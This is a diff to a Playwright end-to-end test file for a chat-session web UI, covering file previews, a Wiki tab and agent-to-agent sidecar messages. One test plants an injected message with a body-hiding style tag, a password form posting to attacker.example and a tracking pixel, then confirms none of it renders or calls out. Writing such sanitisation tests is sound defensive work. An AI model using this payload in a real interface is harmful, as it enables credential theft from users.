@@ -49,7 +49,10 @@ test.beforeAll(() => {
     isSidechain: false, isMeta: false,
     message: {
       role: 'assistant',
-      content: [{ type: 'tool_use', id: 'tool_e2e', name: 'Read', input: { file_path: '/src/MessageView.tsx' } }],
+      content: [
+        { type: 'tool_use', id: 'tool_e2e', name: 'Read', input: { file_path: '/src/MessageView.tsx' } },
+        { type: 'tool_use', id: 'tool_err', name: 'Read', input: { file_path: '/missing.txt' } },
+      ],
     },
   })
   writeLine({
@@ -97,6 +100,14 @@ test.beforeAll(() => {
     isSidechain: false, isMeta: false,
     message: { role: 'user', content: 'Thanks, that makes sense!' },
   })
+  writeLine({
+    type: 'assistant', uuid: 'e2e-msg-007', timestamp: '2025-06-15T14:01:05Z',
+    isSidechain: false, isMeta: false,
+    message: {
+      role: 'assistant',
+      content: [{ type: 'text', text: `[Open local session file](${testSessionPath})` }],
+    },
+  })
 })
 
 test.afterAll(() => {
@@ -114,8 +125,7 @@ async function openSidebar(page) {
 
 async function selectTestSession(page) {
   await openSidebar(page)
-  // Find and click our test session by title text
-  const sessionItem = page.locator(`text=Explain how`).first()
+  const sessionItem = page.locator(`[data-session-id="${TEST_SESSION_ID}"]`)
   await expect(sessionItem).toBeVisible({ timeout: 5000 })
   await sessionItem.click()
   await page.waitForTimeout(500)
@@ -319,13 +329,10 @@ test.describe('Message rendering', () => {
     const expectedHref = `/api/files/raw?path=${encodeURIComponent(expectedPath)}`
     await expect(link).toHaveAttribute('href', expectedHref)
 
-    const [preview] = await Promise.all([
-      page.waitForEvent('popup'),
-      link.click(),
-    ])
-    await preview.waitForLoadState()
-    expect(preview.url()).toBe(new URL(expectedHref, BASE).href)
-    await expect(preview.locator('body')).toContainText('Synthetic session setup')
+    await link.click()
+    await expect(page.getByText(path.basename(TEXT_ARTIFACT_PATH), { exact: true })).toBeVisible()
+    await expect(page.getByText('// Synthetic session setup', { exact: false })).toBeVisible()
+    await page.getByTitle('Close').click()
   })
 
   test('markdown links to HTML artifacts open as rendered sandboxed pages', async ({ page }) => {
@@ -333,14 +340,12 @@ test.describe('Message rendering', () => {
     const expectedHref = `/api/files/html?path=${encodeURIComponent(HTML_ARTIFACT_PATH)}`
     await expect(link).toHaveAttribute('href', expectedHref)
 
-    const [preview] = await Promise.all([
-      page.waitForEvent('popup'),
-      link.click(),
-    ])
-    await preview.waitForLoadState()
-    expect(preview.url()).toBe(new URL(expectedHref, BASE).href)
-    await expect(preview.getByRole('heading', { name: 'Rendered HTML artifact' })).toBeVisible()
-    await expect(preview.locator('body')).not.toContainText('<h1>')
+    await link.click()
+    const preview = page.locator(`iframe[title="${path.basename(HTML_ARTIFACT_PATH)}"]`)
+    await expect(preview).toBeVisible()
+    await expect(preview.contentFrame().getByRole('heading', { name: 'Rendered HTML artifact' })).toBeVisible()
+    await expect(preview.contentFrame().locator('body')).not.toContainText('<h1>')
+    await page.getByTitle('Close').click()
   })
 
   test('thinking is folded into quiet Details beside the final answer', async ({ page }) => {
@@ -551,38 +556,70 @@ test.describe('Tab switching', () => {
     await expect(page.locator('textarea[placeholder="Send a message..."]')).not.toBeVisible()
   })
 
-  test('updates tab explains chats that are not assigned to a Room', async ({ page }) => {
-    await page.getByRole('button', { name: 'Updates', exact: true }).click()
-    const panel = page.getByTestId('updates-panel')
+  test('Wiki explains chats that are not assigned to a Room', async ({ page }) => {
+    await page.route(`**/api/sessions/${TEST_SESSION_ID}/room`, route => route.fulfill({ json: { room: null } }))
+    await page.getByRole('button', { name: 'Wiki', exact: true }).click()
+    const panel = page.getByTestId('wiki-panel')
     await expect(panel).toBeVisible()
-    await expect(panel).toContainText("This chat isn't in a Room")
+    await expect(panel).toContainText('This chat is not in a Room')
     await expect(page.locator('textarea[placeholder="Send a message..."]')).not.toBeVisible()
   })
 })
 
-test('updates tab loads the selected chat Room feed newest first', async ({ page }) => {
-  const room = {
-    name: 'e2e-room', cwd: '/tmp/e2e-room', active: false, latest: null, updatedAt: null,
-    sessions: [{ id: TEST_SESSION_ID, title: 'Explain how markdown rendering works', updatedAt: '2025-06-15T14:01:00Z', isActive: false }],
-    updates: { count: 2, latestAt: '2025-06-15T14:03:00Z', latest: 'newest room update' },
-    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
-  }
-  await page.route('**/api/rooms', route => route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ rooms: [room] }) }))
-  await page.route('**/api/rooms/e2e-room/updates', route => route.fulfill({
-    status: 200, contentType: 'application/json', body: JSON.stringify({ updates: [
-      { id: 'one', ts: '2025-06-15T14:02:00Z', text: 'older room update' },
-      { id: 'two', ts: '2025-06-15T14:03:00Z', text: 'newest room update' },
-    ] }),
-  }))
+test('Wiki loads the selected chat Room caretaker synthesis', async ({ page }) => {
+  await page.route(`**/api/sessions/${TEST_SESSION_ID}/room`, route => route.fulfill({ json: { room: 'e2e-room' } }))
+  await page.route('**/api/rooms/e2e-room/wiki', route => route.fulfill({ json: {
+    pages: [{ name: 'Home', size: 80, updatedAt: '2025-06-15T14:03:00Z' }],
+  } }))
+  await page.route('**/api/rooms/e2e-room/wiki/page**', route => route.fulfill({ json: {
+    name: 'Home',
+    content: '# E2E Room\n\nCaretaker synthesis is visible here.',
+    updatedAt: '2025-06-15T14:03:00Z',
+  } }))
   await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
   await expect(page.locator('p').filter({ hasText: 'Thanks, that makes sense!' }).first()).toBeVisible({ timeout: 10000 })
-  await page.getByRole('button', { name: 'Updates', exact: true }).click()
+  await page.getByRole('button', { name: 'Wiki', exact: true }).click()
 
-  const panel = page.getByTestId('updates-panel')
-  await expect(panel).toContainText('Updates for #e2e-room')
-  await expect(panel).toContainText('newest room update')
-  const feedText = await panel.innerText()
-  expect(feedText.indexOf('newest room update')).toBeLessThan(feedText.indexOf('older room update'))
+  const panel = page.getByTestId('wiki-panel')
+  await expect(panel).toContainText('Caretaker synthesis is visible here.')
+  await expect(panel.getByRole('button', { name: 'Updates', exact: true })).toHaveCount(0)
+})
+
+test('Room Sidecar A2A is visible and passively rendered in the canonical Leader chat', async ({ page }) => {
+  const a2a = [
+    { seq: 1, ts: Date.parse('2026-08-30T12:00:00Z'), from: 'leader', to: 'caretaker', text: 'Check the Wiki decision.' },
+    { seq: 3, ts: Date.parse('2026-08-30T12:00:02Z'), from: 'caretaker', to: 'leader', text: '<style>body{display:none}</style><form action="https://attacker.example/steal"><input name="password"></form>![pixel](https://attacker.example/pixel)' },
+    { seq: 2, ts: Date.parse('2026-08-30T12:00:01Z'), from: 'caretaker', to: 'leader', text: 'Decision is current.' },
+  ]
+  let remoteMediaRequests = 0
+  await page.route('https://attacker.example/**', async route => {
+    remoteMediaRequests++
+    await route.abort()
+  })
+  await page.route(`**/api/sessions/${TEST_SESSION_ID}/room`, route => route.fulfill({ json: { room: 'feather' } }))
+  await page.route('**/api/sidecar/room-feather/stream', route => route.fulfill({
+    status: 200,
+    contentType: 'text/event-stream',
+    body: `event: connected\ndata: {}\n\n${a2a.map(message => `event: message\ndata: ${JSON.stringify(message)}\n\n`).join('')}`,
+  }))
+  await page.route('**/api/sidecar/room-feather', route => route.fulfill({ json: {
+    group: {
+      id: 'room-feather', kind: 'room', roomName: 'feather', status: 'active',
+      members: [
+        { sessionId: TEST_SESSION_ID, role: 'leader', spawned: false },
+        { sessionId: 'caretaker-session', role: 'caretaker', spawned: false },
+      ],
+    },
+    thread: a2a,
+  } }))
+
+  await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
+  await expect(page.getByText('Check the Wiki decision.')).toBeVisible()
+  await expect(page.getByText('Decision is current.')).toBeVisible()
+  await expect(page.getByText(/\[feather-sidecar room-feather/)).toHaveCount(0)
+  const passiveMarkdown = page.locator('.markdown').filter({ hasText: 'Decision is current.' })
+  await expect(passiveMarkdown.locator('style, form, input[name="password"], img[src*="attacker.example"]')).toHaveCount(0)
+  expect(remoteMediaRequests).toBe(0)
 })
 
 // ── Live SSE updates in the browser ─────────────────────────────────────────
@@ -593,6 +630,7 @@ test.describe('Live updates', () => {
     await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
     await expect(page.locator('.markdown').first()).toBeVisible({ timeout: 5000 })
     await streamRequest
+
 
     const liveUuid = `e2e-live-${Date.now()}`
     writeLine({
@@ -649,6 +687,7 @@ test.describe('Live updates', () => {
     const finalBubble = page.locator('[data-role="assistant"]').filter({ hasText: 'Status lifecycle complete.' })
     await expect(finalBubble.getByTestId('work-log-summary')).toBeVisible()
   })
+
 })
 
 // ── Mobile viewport ─────────────────────────────────────────────────────────
